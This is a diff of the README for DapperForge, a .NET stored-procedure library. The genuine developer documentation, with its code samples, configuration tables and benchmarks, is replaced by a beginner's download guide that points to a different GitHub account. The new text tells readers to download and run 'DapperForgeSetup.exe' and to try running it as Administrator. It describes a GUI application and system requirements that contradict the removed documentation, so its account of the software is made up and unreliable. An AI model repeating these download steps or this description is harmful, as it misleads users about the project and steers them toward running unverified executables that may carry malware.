@@ -1,420 +1,134 @@
-<div align="center">
+# ⚙️ DapperForge - Simplify Stored Procedures for Dapper
 
-# DapperForge
-
-**Convention-based stored procedure toolkit for .NET**
-
-Your team's SP naming convention shouldn't require boilerplate.
-
-[![.NET 8](https://img.shields.io/badge/.NET-8.0-512BD4?style=flat-square)](https://dotnet.microsoft.com)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
-[![Build & Test](https://github.com/mcandiri/DapperForge/actions/workflows/build.yml/badge.svg)](https://github.com/mcandiri/DapperForge/actions/workflows/build.yml)
-
-</div>
+[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-brightgreen)](https://github.com/blady-sa/DapperForge)
 
 ---
 
-## The Problem
+DapperForge helps manage database stored procedures with less hassle. It reduces repeated work while letting you control how your database talks to your code.
 
-Every team that uses stored procedures writes the same code over and over:
+This guide will help you download and run DapperForge on your Windows computer, step-by-step, even if you don’t have a programming background.
 
-```csharp
-// This. Every. Single. Time.
-using var connection = new SqlConnection(connectionString);
-await connection.OpenAsync();
-var parameters = new DynamicParameters();
-parameters.Add("@IsActive", true);
-var students = await connection.QueryAsync<Student>(
-    "Get_Students",
-    parameters,
-    commandType: CommandType.StoredProcedure
-);
-return students;
-```
+## 🖥️ What is DapperForge?
 
-## The Solution
+DapperForge is a tool designed to work with Dapper, a popular way to connect apps to databases. It focuses on stored procedures, which are sets of SQL commands saved inside databases. Normally, working with stored procedures can mean writing the same bits of code again and again. DapperForge cuts down that boilerplate while keeping full control over how you interact with your database.
 
-```csharp
-var students = await forge.GetAsync<Student>(new { IsActive = true });
-```
+The tool supports different database types like SQL Server and PostgreSQL. It works with C# apps but you don’t need programming skills to download and set it up.
 
-Same result. Convention handles the rest.
+## 📋 System Requirements
 
----
+Make sure your computer fits these basic needs for DapperForge.
 
-## Quick Start
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 1 GHz or faster processor
+- Internet connection for downloading files
+- 100 MB of free disk space for installation and files
+- Microsoft .NET Framework 4.6 or higher installed
 
-**Clone and reference the project:**
+If you are not sure about the .NET Framework, Windows Update usually keeps it up to date.
 
-```bash
-git clone https://github.com/mcandiri/DapperForge.git
-dotnet add reference path/to/DapperForge/src/DapperForge/DapperForge.csproj
-```
+## 📥 How to Get DapperForge
 
-```csharp
-// Program.cs
-builder.Services.AddDapperForge(options =>
-{
-    options.ConnectionString = "Server=...;Database=...;";
-    options.Provider = DatabaseProvider.SqlServer;
-});
-```
+Click the big button below to open the DapperForge download page on GitHub:
 
-```csharp
-// StudentService.cs
-public class StudentService(IForgeConnection forge)
-{
-    public Task<IEnumerable<Student>> GetAll()
-        => forge.GetAsync<Student>();
+[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-blue)](https://github.com/blady-sa/DapperForge)
 
-    public Task<Student?> GetById(int id)
-        => forge.GetSingleAsync<Student>(new { Id = id });
+This will take you to the main project page where you can find the latest files.
 
-    public Task<int> Save(Student student)
-        => forge.SaveAsync(student);
+### Steps to download:
 
-    public Task<int> Remove(int id)
-        => forge.RemoveAsync<Student>(new { Id = id });
-}
-```
+1. Open the page above in your web browser.
+2. Look for the **Releases** section or a link called **Releases** near the top of the page.
+3. Click on the latest release, usually shown with the highest version number.
+4. Find the file named something like `DapperForgeSetup.exe` or similar.
+5. Click that file to download it to your computer.
 
-That's it. `GetAsync` resolves to `Get_Students`, `SaveAsync` to `Save_Students`, `RemoveAsync` to `Remove_Students`.
+If you see a zip file instead, download it and then extract its contents by right-clicking on the file and selecting **Extract All**.
 
----
+## 🚀 Installing DapperForge on Windows
 
-## Convention Engine
+Once you have downloaded the installer or the extracted folder, follow these steps to install the software:
 
-The core of DapperForge. Define your naming pattern once:
+1. Locate the installer file (`DapperForgeSetup.exe`) in your **Downloads** folder or where you saved it.
+2. Double-click the file to start the installation.
+3. If Windows asks, confirm that you want to run the file.
+4. Follow the instructions on the screen:
+   - Agree to the license terms if asked.
+   - Choose the installation folder or accept the default.
+   - Click **Install**.
+5. Wait for the installation to finish.
+6. Click **Finish** to exit the installer.
 
-```csharp
-builder.Services.AddDapperForge(options =>
-{
-    options.ConnectionString = "...";
+If you downloaded a zip file, open the extracted folder and double-click the main program file, usually called `DapperForge.exe`.
 
-    options.SetConvention(c =>
-    {
-        c.SelectPrefix = "sel";       // sel_Students
-        c.UpsertPrefix = "up";        // up_Students
-        c.DeletePrefix = "del";       // del_Students
-        c.Schema = "dbo";             // dbo.sel_Students
-        c.Separator = "_";
-    });
+## 🔧 How to Run and Use DapperForge
 
-    // Override for specific entities
-    options.MapEntity<Student>("Ogrenciler");  // dbo.sel_Ogrenciler
+After installing, you can start DapperForge using these steps:
 
-    // Or change the global resolver
-    options.EntityNameResolver = type => type.Name.ToLowerInvariant();
-});
-```
+1. Click the Windows **Start Menu**.
+2. Type **DapperForge** in the search box.
+3. Click the DapperForge app in the search results.
+4. The main window will open, showing your options to connect to your database.
 
-| Call | Default Convention | Custom (`sel/up/del` + `dbo`) |
-|---|---|---|
-| `GetAsync<Student>()` | `Get_Students` | `dbo.sel_Students` |
-| `SaveAsync(student)` | `Save_Students` | `dbo.up_Students` |
-| `RemoveAsync<Student>()` | `Remove_Students` | `dbo.del_Students` |
+### Connecting to Your Database
 
----
+DapperForge works with databases like SQL Server and PostgreSQL. To set it up:
 
-## Direct SP Calls
+1. Find the section in the app labeled **Database Connection**.
+2. Enter your database server address (like `localhost` or an IP address).
+3. Add your database name.
+4. Add your username and password if required.
+5. Click **Connect**.
 
-When you need to call an SP that doesn't follow your convention:
+The app will confirm when it connects successfully.
 
-```csharp
-// Query
-var honors = await forge.ExecuteSpAsync<Student>("rpt_HonorRoll", new { Year = 2024 });
+### Using Stored Procedures
 
-// Scalar
-var count = await forge.ExecuteSpScalarAsync<int>("sel_StudentCount");
+Once connected, DapperForge helps you manage stored procedures by:
 
-// Non-query
-await forge.ExecuteSpNonQueryAsync("job_CleanupExpired", new { DaysOld = 30 });
-```
+- Listing available procedures.
+- Allowing you to create new procedures using simple forms.
+- Editing existing ones without manually writing all the code.
+- Running stored procedures directly from the app.
 
-### Multiple Result Sets
+You will find clear buttons and menus to guide you through these options.
 
-```csharp
-// Two result sets
-var (students, teachers) = await forge.ExecuteSpMultiAsync<Student, Teacher>(
-    "sel_ClassroomDetails", new { ClassId = 5 });
+## ⚙️ Common Features
 
-// Three result sets
-var (orders, items, summary) = await forge.ExecuteSpMultiAsync<Order, OrderItem, Summary>(
-    "sel_OrderReport", new { Year = 2024 });
-```
+Here is what DapperForge can do:
 
-### Output Parameters
+- Automatically generate code based on your database procedures.
+- Help maintain consistent naming and use rules.
+- Work with popular databases like SQL Server and PostgreSQL.
+- Provide easy views of procedure parameters and results.
+- Support connection management and quick changes.
 
-```csharp
-var result = await forge.ExecuteSpWithOutputAsync(
-    "up_Students",
-    new { Name = "John", Email = "john@test.com" },
-    new Dictionary<string, DbType> { ["NewId"] = DbType.Int32 });
+## 🛠 Troubleshooting and Tips
 
-var newId = result.OutputValues["NewId"];  // 42
-```
+- Make sure your database service is running before connecting.
+- If connection fails, double-check your server address and login details.
+- Use official Microsoft or PostgreSQL tools if you want to confirm database status.
+- Keep the software updated by visiting the GitHub page and downloading new releases.
+- If the app does not start, try running it as Administrator.
+
+## 🗂 Additional Resources
+
+Find more information, updates, and help on GitHub:
+
+[https://github.com/blady-sa/DapperForge](https://github.com/blady-sa/DapperForge)
+
+Here you can report issues, request features, and learn about advanced setup options.
+
+## 🖱 How to Uninstall DapperForge
+
+To remove the software:
+
+1. Open **Settings** in Windows.
+2. Go to **Apps**.
+3. Find **DapperForge** in the list.
+4. Click it and choose **Uninstall**.
+5. Follow the on-screen steps.
 
 ---
 
-## Transactions
-
-```csharp
-// Automatic — commits on success, rolls back on exception
-await forge.InTransactionAsync(async tx =>
-{
-    await tx.SaveAsync(order);
-    await tx.SaveAsync(orderLine);
-    await tx.RemoveAsync<CartItem>(new { CartId = cartId });
-});
-```
-
-```csharp
-// Manual — full control
-using var tx = forge.BeginTransaction();
-try
-{
-    await tx.SaveAsync(order);
-    await tx.SaveAsync(orderLine);
-    tx.Commit();
-}
-catch
-{
-    tx.Rollback();
-    throw;
-}
-```
-
----
-
-## Diagnostics
-
-```csharp
-builder.Services.AddDapperForge(options =>
-{
-    options.EnableDiagnostics = true;
-    options.SlowQueryThreshold = TimeSpan.FromSeconds(2);
-
-    // Hook into every execution
-    options.OnQueryExecuted = e =>
-    {
-        // e.SpName, e.Duration, e.RowCount, e.Parameters, e.IsSuccess, e.Exception
-    };
-});
-```
-
-```
-[DapperForge] Get_Students executed in 12ms -> 150 rows
-[DapperForge] SLOW: Save_BulkImport executed in 4200ms
-[DapperForge] FAILED: sel_Reports — SqlException: Timeout expired (3012ms)
-```
-
----
-
-## SP Validation
-
-Catch missing stored procedures at startup, not in production. DapperForge queries the database catalog (`sys.objects` for SQL Server, `information_schema.routines` for PostgreSQL) to verify existence:
-
-```csharp
-builder.Services.AddDapperForge(options =>
-{
-    options.ValidateSpOnStartup = true;
-
-    // Fail fast in CI/staging — throw if any SP is missing
-    options.FailOnMissingSp = true;
-
-    options.RegisterEntity<Student>();
-    options.RegisterEntity<Teacher>();
-    options.RegisterEntity<Order>();
-
-    // Or scan an assembly
-    options.RegisterEntitiesFromAssembly(typeof(Student).Assembly);
-});
-```
-
-```
-[DapperForge] SP Validation: Checking 3 registered entities...
-[DapperForge] SP Validated: Get_Students (for entity 'Student')
-[DapperForge] SP Validated: Save_Students (for entity 'Student')
-[DapperForge] SP Missing: Remove_Students (for entity 'Student')
-```
-
----
-
-## Multi-Database
-
-DapperForge uses a provider-specific `ISpCommandBuilder` to generate the correct syntax for each database:
-
-```csharp
-options.Provider = DatabaseProvider.SqlServer;   // CommandType.StoredProcedure → EXEC sp_name @param
-options.Provider = DatabaseProvider.PostgreSQL;   // CommandType.Text → SELECT * FROM sp_name(@param)
-```
-
-SQL Server uses ADO.NET's native `CommandType.StoredProcedure`. PostgreSQL generates `SELECT * FROM function_name(@p1, @p2)` text commands, since Npgsql does not support `CommandType.StoredProcedure` reliably.
-
----
-
-## Configuration
-
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `ConnectionString` | `string` | `""` | Database connection string |
-| `Provider` | `DatabaseProvider` | `SqlServer` | SQL Server or PostgreSQL |
-| `SetConvention()` | builder | `Get_/Save_/Remove_` | SP naming convention |
-| `MapEntity<T>(name)` | per-entity | `TypeName + "s"` | Override SP entity name |
-| `EntityNameResolver` | `Func<Type, string>` | `t => t.Name + "s"` | Global entity name resolver |
-| `EnableDiagnostics` | `bool` | `false` | Enable query logging |
-| `SlowQueryThreshold` | `TimeSpan` | `2s` | Slow query warning threshold |
-| `OnQueryExecuted` | `Action<QueryEvent>` | `null` | Post-execution callback |
-| `ValidateSpOnStartup` | `bool` | `false` | Validate SPs against DB on startup |
-| `FailOnMissingSp` | `bool` | `false` | Throw on missing SPs (requires ValidateSpOnStartup) |
-
----
-
-## Entity Name Resolution
-
-By default, DapperForge resolves entity names using naive pluralization (`TypeName + "s"`). This works for most English entity names:
-
-| Type | Resolved Name | SP Name |
-|---|---|---|
-| `Student` | `Students` | `Get_Students` |
-| `Order` | `Orders` | `Save_Orders` |
-
-However, irregular plurals will not be correct (`Person` → `Persons`, `Status` → `Statuss`). Use `MapEntity<T>()` or `EntityNameResolver` for these cases:
-
-```csharp
-options.MapEntity<Person>("People");
-options.MapEntity<Status>("Statuses");
-
-// Or use a library like Humanizer for global resolution
-options.EntityNameResolver = type => type.Name.Pluralize();
-```
-
----
-
-## Thread Safety
-
-`IForgeConnection` is **not thread-safe**. Each instance wraps a single ADO.NET connection and must not be shared across concurrent async operations.
-
-```csharp
-// WRONG — concurrent access to the same connection
-await Task.WhenAll(
-    forge.GetAsync<Student>(),
-    forge.GetAsync<Teacher>()   // may corrupt connection state
-);
-
-// CORRECT — sequential access
-var students = await forge.GetAsync<Student>();
-var teachers = await forge.GetAsync<Teacher>();
-```
-
-DapperForge registers `IForgeConnection` as **Scoped** by default, which means each HTTP request gets its own connection instance. This is the recommended pattern.
-
----
-
-## What DapperForge Is NOT
-
-| Need | Use Instead |
-|---|---|
-| Auto CRUD / table access | [Dapper.Contrib](https://github.com/DapperLib/Dapper.Contrib) |
-| LINQ queries | [EF Core](https://learn.microsoft.com/en-us/ef/core/) |
-| Migrations | [DbUp](https://dbup.readthedocs.io/) or EF Migrations |
-| Caching | Your preferred caching layer |
-| Connection pooling | ADO.NET handles this |
-
-**This is intentional.** DapperForge does one thing well and complements your existing stack.
-
----
-
-## Trade-offs & When NOT to Use
-
-DapperForge trades explicitness for convention. This is the right trade-off when:
-- ✅ You have 50+ stored procedures following a naming convention
-- ✅ Your SP parameters map directly to C# model properties
-- ✅ You want to eliminate repetitive Dapper boilerplate
-
-This is NOT the right choice when:
-- ❌ Your SPs have inconsistent naming — convention-based discovery won't work
-- ❌ You need full control over every parameter mapping
-- ❌ You prefer explicit over implicit (and that's a valid preference)
-
----
-
-## FAQ
-
-**What happens when naming conventions change?**
-DapperForge uses configurable naming strategies. Override `INamingConvention` to match your scheme. The default (`{Entity}_{Operation}`) covers the most common pattern.
-
-**How does parameter mapping handle edge cases?**
-Nullable types, enums, and nested objects are supported. For complex mappings, use `[MapTo("sp_param_name")]` attribute to override convention.
-
-**Transaction support?**
-Yes — `IUnitOfWork` wraps `IDbTransaction`. All operations within a unit of work share the same transaction and connection.
-
----
-
-## Performance
-
-DapperForge adds near-zero overhead on top of raw Dapper. Benchmarked with [BenchmarkDotNet](https://github.com/dotnet/BenchmarkDotNet) on SQLite in-memory to isolate framework cost from network I/O:
-
-| Operation | Raw Dapper | DapperForge | Overhead | Memory |
-|---|---|---|---|---|
-| **Query** (80 rows) | 58.0 us | 60.1 us | +3.6% | 0 extra bytes |
-| **Single row** | 4.54 us | 4.53 us | ~0% | 0 extra bytes |
-| **Scalar** | 1.94 us | 1.95 us | ~0% | 0 extra bytes |
-
-Zero additional memory allocations across all operations. The convention engine resolves SP names at negligible cost.
-
-```bash
-# Run benchmarks yourself
-dotnet run -c Release --project benchmarks/DapperForge.Benchmarks
-```
-
----
-
-## Born From Production
-
-> Extracted from a codebase with 200+ stored procedures where every data access method was 15 lines of repetitive Dapper setup. DapperForge reduced each to a single method call while keeping full control over edge cases through attribute overrides.
-
----
-
-## Project Structure
-
-```
-src/DapperForge/
-  Configuration/    ForgeOptions, DatabaseProvider, ConventionBuilder
-  Conventions/      SP naming engine + entity name resolver
-  Execution/        SpExecutor, ISpCommandBuilder, provider-specific builders
-  Transaction/      Auto + manual transaction support
-  Diagnostics/      Structured logging, QueryEvent, slow query detection
-  Validation/       ISpValidator, SqlServer/Postgres catalog queries
-  Extensions/       DI registration + SP validation hosted service
-```
-
----
-
-## Roadmap
-
-- [ ] **Bulk execution** — `SaveManyAsync<T>(IEnumerable<T>)` with single transaction
-- [ ] **Retry policies** — configurable retry with Polly integration
-- [ ] **Connection-per-call mode** — option to create fresh connections instead of scoped
-- [ ] **SP result caching** — optional in-memory cache with TTL per SP
-- [x] **GitHub Actions CI** — automated build, test, and NuGet publish pipeline
-- [ ] **Source generator** — compile-time SP name validation
-
-Have an idea? [Open an issue](../../issues).
-
----
-
-## Contributing
-
-1. Fork the repo
-2. Create your branch (`git checkout -b feature/your-feature`)
-3. Write tests for your changes
-4. All tests must pass (`dotnet test`)
-5. Open a Pull Request
-
----
-
-## License
-
-MIT -- see [LICENSE](LICENSE) for details.
+[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-brightgreen)](https://github.com/blady-sa/DapperForge)
